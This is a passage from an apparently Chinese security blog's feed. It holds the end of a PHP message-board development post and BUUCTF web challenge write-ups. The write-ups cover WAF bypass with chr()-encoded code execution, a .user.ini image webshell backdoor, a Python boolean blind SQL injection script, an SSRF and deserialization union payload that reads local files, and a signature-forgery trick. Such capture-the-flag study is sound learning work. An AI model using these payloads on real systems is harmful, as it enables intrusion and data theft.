id int unsigned not null auto_increment,</span><br><span class="line">    username varchar(255) not null ,</span><br><span class="line">    password varchar(255) not null ,</span><br><span class="line">    email varchar(255) not null,</span><br><span class="line">    comment varchar(255) not nul ,</span><br><span class="line">    join_date date not null ,</span><br><span class="line">    primary key(id),</span><br><span class="line">    unique key(username),</span><br><span class="line">    unique key(password)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8;</span><br></pre></td></tr></table></figure><hr><p>admin表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create table admin(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    username varchar(255) not null,</span><br><span class="line">    password varchar(255) not null,</span><br><span class="line">    primary key(id)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8</span><br><span class="line"></span><br><span class="line">insert into admin(username,password) values (&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;);</span><br></pre></td></tr></table></figure><hr><h3 id="功能点分析"><a href="#功能点分析" class="headerlink" title="功能点分析"></a>功能点分析</h3><p>在设计后台代码的时候，首先是分析功能点，这个很重要。<strong>因为大网站都是靠一个个小的功能点堆积起来的。</strong><br>这个留言板主要的功能为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户注册</span><br><span class="line">用户登录</span><br><span class="line">密码找回</span><br><span class="line">个人信息设置(信息更新 头像上传)</span><br><span class="line">留言发布</span><br><span class="line">留言展示</span><br><span class="line">前台留言分页展示</span><br><span class="line">搜索界面</span><br><span class="line">管理员后台登录</span><br><span class="line">后台用户管理</span><br><span class="line">后台留言管理</span><br></pre></td></tr></table></figure><p>所以在写的时候，要一个功能一个功能的去实现。</p><hr><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>代码就不展示了，太多了23333….. 最后放几张效果图吧</p><img src="/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91/1.png" class title="Da4er"><img src="/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91/2.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;经过两天的奋斗，终于把一套简单的PHP留言板开发完成了。这套源码从前台到后台，最后到数据库都是一步一步来完成的，主要是为了熟悉一下PHP开发的基本流程和一些功能点的设计思路，为了接下来的代码审计做准备。&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发" scheme="https://da4er.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF Web持续更新</title>
    <link href="https://da4er.top/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-03T02:47:54.000Z</published>
    <updated>2020-04-08T07:54:08.518Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p><strong>知识点：PHP字符串的解析漏洞。</strong></p><blockquote><p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：<br><a id="more"></a><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"></p></blockquote><p>当我们传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20%20da4[er%00&#x3D;42&quot;+AND+1&#x3D;0–</span><br></pre></td></tr></table></figure><br>PHP在解析的时候会自动将不合法的字符转换，转换规则如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.删除空白符</span><br><span class="line"></span><br><span class="line">2.将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure><br>所以上面的参数最后会变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">da4_er&#x3D;42&quot; AND 1&#x3D;0–</span><br></pre></td></tr></table></figure><br>从而绕过一些waf的检测。<br><strong>解题：</strong><br>查看网页源代码发现题目存在waf，同时发现calc.php的后台处理程序。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><br>访问calc.php:<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><br>当我们传入非int型的参数后，会被waf拦截：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><br>但是可以传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格num</span><br></pre></td></tr></table></figure><br>绕过waf检测。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><br>绕过之后就是简单的代码执行，但是过滤了一些特殊字符，可以使用chr()函数绕过。<br>首先通过scandir扫描根目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><br>最后通过file_get_contents函数读取文件内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"></p><hr><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p><strong>知识点：.user.ini创建隐藏后门。</strong></p><blockquote><p>.user.ini中设置php.ini中PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI 模式的服务器上都可以使用.user.ini。</p></blockquote><p>利用方法：.user.ini可以自定义php.ini，所以我们可以设置两个参<strong>auto_prepend_file和auto_append_file</strong><br>这两个参数的意思是：如果在上传的.user.ini目录下，有一个可执行的php文件，那么设置这两个参数后可以自动包含其他的php代码文件，如同：<strong>require和include作用一样。</strong></p><p>唯一不一样的是：auto_prepend_file在文件前插入，auto_append_file在文件后插入。<br>所以我们在.user.ini文件中写入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;da4er.jpg</span><br></pre></td></tr></table></figure><br>那么在该目录下的可执行php文件中，会自动包含：<strong>require(“./da4er.jpg”);</strong></p><p><strong>解题：</strong><br>首先上传一个小马图片，这个题目作了三个限制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不能上传ph或php结尾的，</span><br><span class="line">存在文件头过滤，需要添加图片文件的文件头</span><br><span class="line">文件的内容不能包含&lt;?，但可以上传&lt;script language&#x3D;&#39;php&#39;&gt;&lt;scirpt&gt;类型的图片马来绕过。</span><br></pre></td></tr></table></figure><br>上传后发现目录下还存在一个index.php，这就给利用.user.ini提供了条件<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><br>所以直接上传.user.ini文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;script.jpg</span><br></pre></td></tr></table></figure><br>便可得到flag。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er"></p><hr><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p><strong>知识点：布尔盲注，绕过过滤空格的sql注入。</strong><br>绕过空格：<br>可以使用一些url编码的特殊字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%09,%0a,%0b,%0c,%0d,%20,%a0 )来替换空格，用or &#39;1&#39;&#x3D;&#39;1的方式闭合后面的引号，这样就可以绕过空格加注释过滤的sql注入。</span><br></pre></td></tr></table></figure><br>使用括号()</p><hr><p>布尔盲注：正确和错误返回不一样。</p><hr><p><strong>解题：</strong><br>首先拿到题目，简单测试一下发现有过滤，看到id知道是数字型的注入。<br>先fuzz一下：<br>发现过滤了空格，and，or，/**/等关键字，但是ascii和substr没有被过滤，想到布尔盲注。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="Da4er"><br>在测试一下，这题是否可以使用布尔盲注，发现正确和错误返回不一样，所以就可以写脚本了。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class title="Da4er"><br>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;c2f8d78b-be94-4e32-9389-c13225236eb1.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">x &#x3D; string.printable</span><br><span class="line"># print(x)</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &quot;id&quot;:&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,60):</span><br><span class="line">    for j in x:</span><br><span class="line">        data[&quot;id&quot;] &#x3D; &quot;1&#x3D;(ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%s)&#x3D;1&quot;%(i,ord(j))</span><br><span class="line">        resp &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">        if &quot;Hello&quot; in resp.text:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><hr><h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p><strong>知识点</strong>：SSRF漏洞利用，PHP反序列化，SQL注入<br>在php代码中使用curl_exec函数访问内网服务器资源的时候，会造成ssrf漏洞。<br>PHP反序列化，调用魔法函数。</p><hr><p><strong>解题：</strong><br>扫描目录发现有个备份文件：<br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();                                   &#x2F;&#x2F;初始化一个curl会话</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);                 &#x2F;&#x2F;设置需要抓取的URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         &#x2F;&#x2F;设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上</span><br><span class="line">        $output &#x3D; curl_exec($ch);                            &#x2F;&#x2F;运行cURL，请求网页</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);          &#x2F;&#x2F;关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>发现get函数会造成ssrf漏洞，接着去测试发现在view.php页面存在sql注入。<br>而且union select在一起会被过滤，可以使用/**/进行绕过。<br>所以可以直接构造反序列化，获取flag.php文件。<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><br>得到flag：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/14.png" class title="Da4er"></p><hr><h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>打开网页查看源代码，可以查看到格式化之后的代码。源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python#encoding&#x3D;utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport json</span><br><span class="line"></span><br><span class="line">reload(sys)sys.setdefaultencoding(&#39;latin1&#39;)</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key &#x3D; os.urandom(16)</span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action &#x3D; action</span><br><span class="line">        self.param &#x3D; param</span><br><span class="line">        self.sign &#x3D; sign</span><br><span class="line">        self.sandbox &#x3D; md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)</span><br><span class="line">                resp &#x3D; scan(self.param)</span><br><span class="line">                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#39;data&#39;] &#x3D; resp</span><br><span class="line">                else:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">                result[&#39;data&#39;] &#x3D; f.read()</span><br><span class="line">            if result[&#39;code&#39;] &#x3D;&#x3D; 500:</span><br><span class="line">                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def challenge():</span><br><span class="line">    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip &#x3D; request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task &#x3D; Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())@app.route(&#39;&#x2F;&#39;)def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check&#x3D;param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.debug &#x3D; False</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;80)</span><br></pre></td></tr></table></figure><br>看到是python的flask框架，三个路由。先来分析一下这三个路由的作用：<br>geneSign<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br></pre></td></tr></table></figure><br>这个页面主要是通过get或者post方式提交param参数，返回getSign处理的action和param的结果。跟进getSign函数中查看发现是返回md5(secert_key + param + action)。</p><hr><p>De1ta<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def challenge():</span><br><span class="line">    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip &#x3D; request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task &#x3D; Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br></pre></td></tr></table></figure><br>这个页面是接收action，param，sign参数执行Exec函数，跟进Exec函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def Exec(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)</span><br><span class="line">                resp &#x3D; scan(self.param)</span><br><span class="line">                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#39;data&#39;] &#x3D; resp</span><br><span class="line">                else:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">                result[&#39;data&#39;] &#x3D; f.read()</span><br><span class="line">            if result[&#39;code&#39;] &#x3D;&#x3D; 500:</span><br><span class="line">                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br></pre></td></tr></table></figure><br>分析知道这段代码逻辑是：用客户端ip的md5值创建一个sandbox，如果action参数中有scan就将param参数的内容写在result.txt文件中；如果action参数中有read就读取写入的文件。</p><hr><p>/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br></pre></td></tr></table></figure><br>这个页面就是获取源代码的页面。</p><hr><p><strong>解题：</strong><br>这道题就是在Da1ta页面中传入如下参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;readscan</span><br><span class="line">param&#x3D;flag.txt</span><br><span class="line">sign&#x3D;md5(secert_key+read+sign)</span><br></pre></td></tr></table></figure><br>在geneSign函数中可以获得到md5(secert_key+param+sign)的值，我们可以在这个页面传入param=flag.txtread 即可完成字符串的拼接。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/15.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/16.png" class title="Da4er"></p><hr><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" 